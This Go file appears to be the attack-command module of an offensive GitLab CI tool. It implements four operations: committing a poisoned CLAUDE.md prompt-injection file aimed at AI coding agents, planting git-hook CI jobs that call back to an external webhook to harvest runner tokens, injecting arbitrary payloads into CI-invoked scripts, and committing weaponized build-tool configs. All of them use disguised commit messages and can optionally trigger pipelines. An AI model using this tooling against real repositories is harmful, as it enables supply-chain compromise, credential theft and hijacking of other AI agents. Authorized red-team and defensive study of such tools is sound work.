package cmd

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/mr-pmillz/gogatoz/pkg/attack"
	payloadgen "github.com/mr-pmillz/gogatoz/pkg/attack/payloads"
	"github.com/mr-pmillz/gogatoz/pkg/attack/scriptinject"
	"github.com/mr-pmillz/gogatoz/pkg/gitlabx"
	"github.com/mr-pmillz/gogatoz/pkg/pipeline"
	"github.com/mr-pmillz/gogatoz/pkg/pivot"
	"github.com/spf13/cobra"
	gitlab "gitlab.com/gitlab-org/api/client-go"
)

// runAttackAIInject commits a poisoned AI config file (e.g., CLAUDE.md).
func runAttackAIInject(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
	if strings.TrimSpace(atkBranch) == "" {
		atkBranch = attack.GogatozAttacks
	}
	finalBranch, err := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
	if err != nil {
		return err
	}
	// Resolve prompt content
	prompt := strings.TrimSpace(atkAIPrompt)
	if prompt == "" && strings.TrimSpace(atkAIPromptFile) != "" {
		b, err := os.ReadFile(strings.TrimSpace(atkAIPromptFile))
		if err != nil {
			return fmt.Errorf("read --ai-prompt-file: %w", err)
		}
		prompt = string(b)
	}
	if prompt == "" {
		prompt = payloadgen.DefaultAIInjectionPrompt()
	}
	configFile := strings.TrimSpace(atkAIConfigFile)
	if configFile == "" {
		configFile = "CLAUDE.md"
	}
	if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
		return err
	}
	if strings.TrimSpace(atkMessage) == "" {
		atkMessage = "docs: update project configuration"
	}
	if err := att.UpsertFile(ctx, atkTarget, finalBranch, configFile, prompt, atkMessage); err != nil {
		return err
	}
	fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed %s to branch %s\n", configFile, finalBranch)

	var mrURL string
	var mrIID int64
	if atkCreateMR {
		mr, mrErr := att.CreateMergeRequest(ctx, atkTarget, finalBranch, atkMRTargetBranch, atkMRTitle, atkMRDescription)
		if mrErr != nil {
			return fmt.Errorf("create merge request: %w", mrErr)
		}
		mrURL = mr.WebURL
		mrIID = mr.IID
		fmt.Fprintf(cmd.ErrOrStderr(), "[attack] merge request: %s\n", mrURL)
	}

	if outputJSON {
		out := struct {
			Branch          string `json:"branch"`
			ConfigFile      string `json:"config_file"`
			MergeRequestURL string `json:"merge_request_url,omitempty"`
			MergeRequestIID int64  `json:"merge_request_iid,omitempty"`
		}{
			Branch:          finalBranch,
			ConfigFile:      configFile,
			MergeRequestURL: mrURL,
			MergeRequestIID: mrIID,
		}
		b, _ := json.MarshalIndent(out, "", "  ")
		_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Committed %s to branch %s", configFile, finalBranch))
	if mrURL != "" {
		renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Merge Request: %s", mrURL))
	}
	return nil
}

// runAttackHarvest installs git hooks, waits for callbacks, and harvests tokens.
func runAttackHarvest(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	if strings.TrimSpace(atkWebhook) == "" {
		return fmt.Errorf("--webhook is required for --harvest (external URL reachable from runners)")
	}

	att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
	if _, err := att.SetupUser(ctx); err != nil {
		return fmt.Errorf("setup user: %w", err)
	}

	// Build and commit git-hook payload
	var tags []string
	if strings.TrimSpace(atkTags) != "" {
		for t := range strings.SplitSeq(atkTags, ",") {
			t = strings.TrimSpace(t)
			if t != "" {
				tags = append(tags, t)
			}
		}
	}
	hookYAML := payloadgen.GenerateGitHookYAML(payloadgen.GitHookOptions{
		Common: payloadgen.CommonOptions{
			JobName: strings.TrimSpace(atkJobName),
			Tags:    tags,
		},
		CallbackURL: strings.TrimSpace(atkWebhook),
		HookType:    strings.TrimSpace(atkHookType),
	})

	if strings.TrimSpace(atkBranch) == "" {
		atkBranch = attack.GogatozAttacks
	}
	pipelineURL, err := att.CommitCIPipeline(ctx, atkTarget, atkBranch, hookYAML, "Install CI hook via GoGatoZ")
	if err != nil {
		return fmt.Errorf("commit git-hook payload: %w", err)
	}
	fmt.Fprintf(cmd.ErrOrStderr(), "[harvest] git-hook payload committed: %s\n", pipelineURL)
	fmt.Fprintf(cmd.ErrOrStderr(), "[harvest] waiting for callbacks on %s...\n", atkHarvestListen)

	// Parse timeout
	harvestTimeout, terr := time.ParseDuration(atkHarvestTimeout)
	if terr != nil {
		harvestTimeout = 30 * time.Minute
	}

	// Start harvester
	h := pivot.NewHarvester(pivot.HarvestOptions{
		ListenAddr: atkHarvestListen,
		GitLabURL:  strings.TrimSpace(gitlabURL),
		Timeout:    harvestTimeout,
		Progress: func(e pivot.HarvestEvent) {
			if outputJSON {
				return
			}
			switch e.Type {
			case "listening":
				renderInfo(cmd.OutOrStdout(), e.Message)
			case "callback":
				renderInfo(cmd.OutOrStdout(), e.Message)
			case "credential":
				renderSuccess(cmd.OutOrStdout(), e.Message)
			case "error":
				renderError(cmd.OutOrStdout(), e.Message)
			}
		},
	})

	result, err := h.Run(ctx)
	if err != nil {
		return fmt.Errorf("harvest: %w", err)
	}

	if outputJSON {
		b, _ := json.MarshalIndent(result, "", "  ")
		_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Harvest complete: %d callbacks, %d credentials", result.Callbacks, len(result.Credentials)))
	for _, c := range result.Credentials {
		valid := "unvalidated"
		if c.IsValid {
			valid = fmt.Sprintf("valid (user: %s)", c.Username)
		}
		renderInfo(cmd.OutOrStdout(), fmt.Sprintf("  %s (%s) from %s — %s", c.TokenType, c.TokenHash[:12], c.SourceKey, valid))
	}
	return nil
}

// runAttackInjectScript modifies repo scripts called by CI (workflow hopping).
func runAttackInjectScript(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
	if _, err := att.SetupUser(ctx); err != nil {
		return fmt.Errorf("setup user: %w", err)
	}

	// Resolve payload content
	payload := strings.TrimSpace(atkScriptPayload)
	if payload == "" && strings.TrimSpace(atkScriptPayloadFile) != "" {
		b, err := os.ReadFile(strings.TrimSpace(atkScriptPayloadFile))
		if err != nil {
			return fmt.Errorf("read --script-payload-file: %w", err)
		}
		payload = string(b)
	}
	if payload == "" {
		return fmt.Errorf("--script-payload or --script-payload-file is required for --inject-script")
	}

	// Branch handling
	if strings.TrimSpace(atkBranch) == "" {
		atkBranch = attack.GogatozAttacks
	}
	finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
	if berr != nil {
		return berr
	}

	// Fetch the project to determine the default branch for CI config detection
	var defaultBranch string
	p, _, perr := client.GL.Projects.GetProject(atkTarget, &gitlab.GetProjectOptions{}, gitlab.WithContext(ctx))
	if perr == nil && p != nil {
		defaultBranch = p.DefaultBranch
	}
	if defaultBranch == "" {
		defaultBranch = "main"
	}

	// Determine target script path
	scriptPath := strings.TrimSpace(atkScriptPath)
	if scriptPath == "" {
		// Auto-detect: fetch CI config from the default branch and extract script references
		content, ferr := att.GetFileContent(ctx, atkTarget, defaultBranch, ".gitlab-ci.yml")
		if ferr != nil {
			return fmt.Errorf("fetch .gitlab-ci.yml for script detection: %w", ferr)
		}
		doc, perr := pipeline.Parse(strings.NewReader(content))
		if perr != nil {
			return fmt.Errorf("parse .gitlab-ci.yml: %w", perr)
		}
		refs := scriptinject.ExtractScriptRefs(doc)
		if len(refs) == 0 {
			return fmt.Errorf("no external script references found in .gitlab-ci.yml; use --script-path to specify manually")
		}
		scriptPath = refs[0].Path
		fmt.Fprintf(cmd.ErrOrStderr(), "[attack] auto-detected script: %s (from job %q)\n", scriptPath, refs[0].JobName)
	}

	if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
		return err
	}

	// Fetch original file content from the default branch
	original, ferr := att.GetFileContent(ctx, atkTarget, defaultBranch, scriptPath)
	if ferr != nil {
		return fmt.Errorf("fetch %s from %s: %w", scriptPath, defaultBranch, ferr)
	}

	// Inject payload
	var modified string
	if atkScriptPrepend {
		modified = scriptinject.PrependPayload(original, payload)
	} else {
		modified = scriptinject.AppendPayload(original, payload)
	}

	// Commit modified script
	msg := strings.TrimSpace(atkMessage)
	if msg == "" {
		msg = fmt.Sprintf("chore: update %s", scriptPath)
	}
	if err := att.UpsertFile(ctx, atkTarget, finalBranch, scriptPath, modified, msg); err != nil {
		return fmt.Errorf("commit modified script: %w", err)
	}
	fmt.Fprintf(cmd.ErrOrStderr(), "[attack] injected payload into %s on branch %s\n", scriptPath, finalBranch)

	// Optionally trigger pipeline
	var pipelineID int64
	var pipelineURL string
	if atkTriggerPipeline {
		var err error
		pipelineID, pipelineURL, err = att.TriggerPipeline(ctx, atkTarget, finalBranch)
		if err != nil {
			return fmt.Errorf("trigger pipeline: %w", err)
		}
		fmt.Fprintf(cmd.ErrOrStderr(), "[attack] pipeline: %s\n", pipelineURL)
	}

	if outputJSON {
		out := struct {
			Branch      string `json:"branch"`
			ScriptPath  string `json:"script_path"`
			PipelineURL string `json:"pipeline_url,omitempty"`
			PipelineID  int64  `json:"pipeline_id,omitempty"`
		}{
			Branch:      finalBranch,
			ScriptPath:  scriptPath,
			PipelineURL: pipelineURL,
			PipelineID:  pipelineID,
		}
		b, _ := json.MarshalIndent(out, "", "  ")
		_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Injected payload into %s (branch %s)", scriptPath, finalBranch))
	if pipelineURL != "" {
		renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Pipeline: %s", pipelineURL))
	}
	return nil
}

// runAttackLOTPInject commits weaponized LOTP tool configs (Living off the Pipeline).
func runAttackLOTPInject(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	if strings.TrimSpace(atkLOTPTool) == "" {
		return fmt.Errorf("--lotp-tool is required for --lotp-inject (e.g., npm-gyp, make, pytest, goreleaser, gradle, terraform)")
	}
	if strings.TrimSpace(atkCmd) == "" {
		return fmt.Errorf("--cmd is required for --lotp-inject")
	}
	att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
	la := attack.NewLOTPAttack(att)
	if strings.TrimSpace(atkBranch) == "" {
		atkBranch = attack.GogatozAttacks
	}
	finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
	if berr != nil {
		return berr
	}
	result, err := la.InjectLOTPPayload(ctx, atkTarget, finalBranch, atkLOTPTool, atkCmd)
	if err != nil {
		return fmt.Errorf("LOTP inject: %w", err)
	}
	fmt.Fprintf(cmd.ErrOrStderr(), "[attack] LOTP payload committed to branch %s (%d files)\n", finalBranch, len(result.FilesCommitted))

	var pipelineID int64
	var pipelineURL string
	if atkTriggerPipeline {
		pipelineID, pipelineURL, err = att.TriggerPipeline(ctx, atkTarget, finalBranch)
		if err != nil {
			return fmt.Errorf("trigger pipeline: %w", err)
		}
		fmt.Fprintf(cmd.ErrOrStderr(), "[attack] pipeline: %s\n", pipelineURL)
	}

	if outputJSON {
		out := struct {
			Branch         string   `json:"branch"`
			Tool           string   `json:"tool"`
			FilesCommitted []string `json:"files_committed"`
			Description    string   `json:"description"`
			Reference      string   `json:"reference"`
			PipelineURL    string   `json:"pipeline_url,omitempty"`
			PipelineID     int64    `json:"pipeline_id,omitempty"`
		}{
			Branch:         result.Branch,
			Tool:           result.Tool,
			FilesCommitted: result.FilesCommitted,
			Description:    result.Description,
			Reference:      result.Reference,
			PipelineURL:    pipelineURL,
			PipelineID:     pipelineID,
		}
		b, _ := json.MarshalIndent(out, "", "  ")
		_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("LOTP payload injected (tool=%s branch=%s files=%v)", result.Tool, finalBranch, result.FilesCommitted))
	renderInfo(cmd.OutOrStdout(), result.Description)
	renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Reference: %s", result.Reference))
	if pipelineURL != "" {
		renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Pipeline: %s", pipelineURL))
	}
	return nil
}
